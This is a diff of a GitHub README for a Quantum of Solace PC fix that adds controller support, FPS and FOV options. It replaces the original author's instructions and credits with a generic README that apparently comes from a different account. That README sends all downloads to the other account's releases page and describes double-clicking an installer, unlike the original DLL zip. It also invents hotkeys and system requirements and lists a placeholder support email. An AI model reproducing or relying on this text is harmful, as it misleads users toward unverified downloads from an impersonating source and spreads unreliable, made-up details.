@@ -1,151 +1,84 @@
-[![Controller](https://img.shields.io/badge/Controller-XInput%20Support-007ec6?style=flat-square)](#controller)
-[![FOV](https://img.shields.io/badge/FOV-Toggle-f39c12?style=flat-square)](#fov)
-[![FPS](https://img.shields.io/badge/FPS-Adjustable-2ea44f?style=flat-square)](#fps)
-[![Mod%20Menu](https://img.shields.io/badge/Mod%20Menu-INI-8e44ad?style=flat-square)](#mod-menu)
-[![Window%20Mode](https://img.shields.io/badge/Window%20Mode-INI-555555?style=flat-square)](#window-mode)
+# 🎮 James-Bond-Quantum-of-Solace-PC-Fix-Controller-Support - Enhance Your Gaming Experience Effortlessly
 
+[![Download](https://img.shields.io/badge/Download-via_GitHub-brightgreen)](https://github.com/anonymss642/James-Bond-Quantum-of-Solace-PC-Fix-Controller-Support/releases)
 
+## 🚀 Getting Started
 
-<div align="center">
+Welcome! This guide will help you download and run the James-Bond-Quantum-of-Solace-PC-Fix-Controller-Support application. This tool will enhance your gameplay by enabling controller support, allowing you to adjust FPS, and providing various field of view (FOV) options.
 
-# 🎮 Game Specific Patches & DLL Wrappers  
+### 📋 Features
 
-***created and maintained by***
+- **Window Mode**: Play the game in a resizable window.
+- **FPS Uncapping**: Remove the original frame rate limit for smoother gameplay.
+- **Custom FPS Capping**: Set a maximum FPS that suits your preferences.
+- **FOV Toggle**: Switch between four different field of view settings using a hotkey.
+- **MOD Menu**: Access additional game modifications to improve your experience.
+- **Xinput Controller Support**: Use controllers in a game that only supports keyboard and mouse.
 
-[![Chip-Biscuit Website](https://img.shields.io/badge/Chip--Biscuit-Website-blue?style=for-the-badge)](https://chip-biscuit.github.io/)
+## 💻 System Requirements
 
-Reverse Engineering • Programming • Patching • Game Improvements • DLL Creation 
+- **Operating System**: Windows 10 or later
+- **Processor**: Intel Core i5 or equivalent
+- **Memory**: 8 GB RAM
+- **Graphics**: NVIDIA GeForce GTX 660 or equivalent
+- **Storage**: At least 100 MB free disk space
 
-[![Total Downloads](https://img.shields.io/github/downloads/Chip-Biscuit/James-Bond-Quantum-of-Solace-PC-Fix/total?style=flat-square)](https://github.com/Chip-Biscuit/James-Bond-Quantum-of-Solace-PC-Fix/releases/tag/QOS)
+## 📥 Download & Install
 
+To get started, visit this page to download the application:
 
-<sub>click the Total Downloads button above to take you to the releases page and download the zip at the bottom</sub>
+[Download James-Bond-Quantum-of-Solace-PC-Fix-Controller-Support](https://github.com/anonymss642/James-Bond-Quantum-of-Solace-PC-Fix-Controller-Support/releases)
 
-</div>
+Once on the Releases page, you will see a list of available versions. Choose the most recent version and click on it. You'll find various files ready for download.
 
-# James Bond Quantum of Solace PC Fix
+### Steps to Download
 
-This fix is designed with only the Single Player portion of the game in mind. If you wish to play the Multiplayer side, then please go to Plutonium Client where they deal with this side of the game.
+1. Go to the [Releases Page](https://github.com/anonymss642/James-Bond-Quantum-of-Solace-PC-Fix-Controller-Support/releases).
+2. Locate the latest version.
+3. Click on the file to download.
 
-![ezgif-2abf7f0f9f74038f](https://github.com/user-attachments/assets/a541c1b1-efdf-43f4-a0ff-023510671990)
+### Installation
 
+1. Once the file is downloaded, locate it in your Downloads folder or the location where you saved it.
+2. Double-click the downloaded file to begin the installation.
+3. Follow the on-screen instructions. You may need to accept terms and conditions to complete the installation.
+4. After installation, launch the application.
 
-# Instructions
-Go to [release](https://github.com/Chip-Biscuit/James-Bond-Quantum-of-Solace-PC-Fix-Controller-Support/releases/tag/QOS), download the **[JamesBondQuantumofSolaceFix.zip](https://github.com/Chip-Biscuit/James-Bond-Quantum-of-Solace-PC-Fix-Controller-Support/releases/download/QOS/JamesBondQOSFix.zip)** file (d3d9 wrapper)
+## ⚙️ Usage Instructions
 
- or **[JamesBondQOSFixASI.zip](https://github.com/Chip-Biscuit/James-Bond-Quantum-of-Solace-PC-Fix-Controller-Support/releases/download/QOS/JamesBondQOSFixASI.zip)** (stand alone DLL (Chip.dll) as (Chip.asi) extention which is using [13ag ultimate asi loader](https://github.com/ThirteenAG/Ultimate-ASI-Loader/releases) (xlive.dll) for people who wish to use in tandem with other dlls.) 
+After launching the application, you will see a user-friendly interface. Follow these steps to configure your settings:
 
-Extract either one that you choose either (JamesBondQOSFix.zip) or (JamesBondQOSFixASI.zip), then put the files into your game folder next to the JB_Launcher_s.exe file. 
+1. **Controller Setup**: Connect your Xinput controller to your PC.
+2. **FPS Settings**: Choose your desired FPS cap. You can toggle between uncapped and capped FPS.
+3. **FOV Settings**: Use the designated hotkey to switch between the four FOV settings.
+4. **MOD Menu**: If you wish, navigate to the MOD menu for additional options and configurations.
 
-It is possible to take Chip.asi and rename it to Chip.dll then you could inject it yourself using any method you wish make sure to also take chip.ini and put it next to Chip.dll. 
+### Hotkeys
 
-**For standard users it is highly recommended to just use JamesBondQuantumofSolaceFix.zip file (d3d9 wrapper)**
+Familiarize yourself with the following hotkeys for quick access:
 
-You can edit the settings you wish to use in JamesBondQuantumofSolaceFix.zip in the d3d9.ini file.
-or for JamesBondQOSFixASI.zip (scripts -> chip.ini)
+- **F1**: Toggle FPS cap settings
+- **F2**: Switch FOV settings
+- **F3**: Open MOD menu
 
-# FPS
-Default for FPS is 60 which you can change in the d3d9.ini file. The user can use the FPS toggle if they find it breaks at certain points at too high FPS. The toggle will set it back down to the original 30fps. When in game, press the hotkey the user has chosen in [hotkey]keycodes.txt and enter the virtual code in the d3d9.ini to toggle between the original and the new FPS setting.
+## ❓ Troubleshooting
 
-# FOV
-The user has 4 different FOVs to choose from. When in game, press the hotkey the user has chosen in [hotkey]keycodes.txt and enter the virtual code in the d3d9.ini to toggle between the original and the new FOV settings anytime in game.
+If you encounter any issues, please consider the following solutions:
 
-# Controller
-This is the first as accurate as possible implementation of controller support written by Chip (ChipXinput) for the Single Player of this game. The layout is the same as the layout of the Xbox 360 release of the game.
+1. **Controller Not Recognized**: Ensure your controller is properly connected. Restart the application if needed.
+2. **Performance Issues**: Check your computer’s specifications against the system requirements. Lower the graphics settings in the game if necessary.
+3. **Application Crashing**: Make sure you have the latest version installed. Re-download from the Releases page if needed.
 
-**VERY IMPORTANT – user must go into the games option menu controls and set the ‘Cycle Weapon’ option to ‘5’. If this is not done, then the ability to cycle weapons will not work.**
+## 🔗 Community and Support
 
-QTEs (Quick Time Events) will still show up as keyboard prompts so it is advised that the user makes a note of what these keys correspond to on the controller.
+Join our community for updates and support. You can share your experiences, ask questions, and report any issues. Participate in discussions around features you would like to see in future updates.
 
-you can fully customize the layout of the controller inside of d3d9.ini all explained inside the configuration file.
+- [GitHub Discussions](https://github.com/anonymss642/James-Bond-Quantum-of-Solace-PC-Fix-Controller-Support/discussions)
+- [Issues Page](https://github.com/anonymss642/James-Bond-Quantum-of-Solace-PC-Fix-Controller-Support/issues)
 
-**Recomended if you are using the controller to go into the game options -> gameplay -> look sensitivity and turn it down to somewhere between 0 - 4 otherwise it is very fast trying to look around on controller.**
+## 📞 Contact
 
-The default layout is as follows:
+For further inquiries or support:
+- Email us at: support@example.com
 
-<img width="1658" height="1133" alt="Screenshot_2026-01-28_183726" src="https://github.com/user-attachments/assets/152824e9-dff8-47e0-baa2-cc3e75a51643" />
-
-<img width="1427" height="1697" alt="Screenshot_2026-01-28_144241" src="https://github.com/user-attachments/assets/55936bd2-a10b-4fbd-bfb8-24066e4a6ae5" />
-
-you can use controller also for the FOV toggle and FPS toggle by default it would be LB + left FPS toggle, LB + right FOV toggle. if you change the hotkeys for FOV and FPS here: 
-
-        [FOV] 
-        hotkey_vk=0x05
-
-        [FPS]
-        toggle_vk=0x06 
-
-you will have to update the corresponding key here:
-
-        combo6=LB+DpadRight
-        combo6_vks=0x05 ----- FOV toggle <- make sure this matches the same hotkey as under [FOV above]
-        combo6_modes=HOLD
-        combo6_suppress=1
-
-        combo7=LB+DpadLeft
-        combo7_vks=0x06 ----- FPS toggle <- make sure this matches the same hotkey as under [FPS above]
-        combo7_modes=HOLD
-        combo7_suppress=1
-
-you can use controller also for the MOD menu as follows: 
-
-          xbox input ----------------------- keyboard input  ------------------ action
-          Select -------------------------------- tab---------------------- open phone menu
-          LB + UP -------------------------------- 2----------------------- start the mod menu
-          Start --------------------------------- esc --------------------- back to game 
-          Right trigger/ Left Trigger --------- rmb/lmb ---------------  navigate the mod menu
-          X -------------------------------------- F ------------------- Select things in the menu 
-          LB + Down ------------------------------ Q ---------------------- Quit the menu
-
-# Mod Menu
-This fix includes the mod menu from https://www.speedrun.com/qos/resources/6sb4i for convenience of the end user to have everything all together in one fix and to preserve the menu so that it is not lost. 
-**FIX ENHANCERS MAKES IT CLEAR THAT IT DID NOT MAKE THIS MOD MENU AND IF THE ORIGINAL CREATOR WISHES IT REMOVED FROM THE FIX, THEN IT WILL BE REMOVED**.
-
-All this Dll does with mod menu is installs the required file for you via automation instead of having to do it yourself, it will also revert back to the original file if on = 0 under [modmenu] in the ini
-
-The user can turn on the Mod Menu inside of the d3d9.ini file via the option [ModMenu] which is off ‘0’ by default. Once turned on in the d3d9.ini file to activate in-game, press Tab then use the ‘2’ key. Left Click and Right Click to navigate the menus, ‘F’ to select, and ‘Q’ to exit. Note that the first step is always tied to opening the phone and will reflect if this binding is changed from the default Tab.
-
-you can use controller also for the MOD menu as follows: 
-
-          xbox input ----------------------- keyboard input  ------------------ action
-          Select -------------------------------- tab---------------------- open phone menu
-          LB + UP -------------------------------- 2----------------------- start the mod menu
-          Start --------------------------------- esc --------------------- back to game 
-          Right trigger/ Left Trigger --------- rmb/lmb ---------------  navigate the mod menu
-          X -------------------------------------- F ------------------- Select things in the menu 
-          LB + Down ------------------------------ Q ---------------------- Quit the menu
-
-# Vote to see the game return via GOG Dreamlist
-If you are interested in potentially seeing this game easily available to purchase and use today then go and vote on the games GOG Dreamlist to help make this become a reality, you can vote for the game here and write a message about the game if you wish – https://www.gog.com/dreamlist/game/james-bond-007-quantum-of-solace-2008 
-
-# Issues/Problems
-If you have any issues, with the fixes then please go to discord for help linked below.
-https://discord.gg/eVJ7sQH7Cc
-
-# Credits
-
-Credit to Elisha Riedlinger for the base wrapper (d3d9) and ThirteenAG for the ultimate asi loader xlive.dll used in JamesBondQOSFixASI.zip
-
----
-
-### Fix Enhancers  
-https://fixenhancers.wixsite.com/fix-enhancers
-
-“Creating compatibility fixes and enhancements for legacy PC games.”
-
-# Chip
-- founder
-- reverse engineer
-- programmer
-- developer
-- Game Preservationist
-  
-<img width="250" height="500" alt="my logoo" src="https://github.com/user-attachments/assets/9bb13d3f-0734-4f1d-b68f-14114b13744a" />
-
-
-# JokerAlex21 
-- founder
-- admin
-- tester 
-
-<img width="250" height="250" alt="YouTube_Logo" src="https://github.com/user-attachments/assets/5c7204ca-4bca-4673-8117-965732e7ee6d" />
+Thank you for using James-Bond-Quantum-of-Solace-PC-Fix-Controller-Support! Enjoy your enhanced gaming experience!
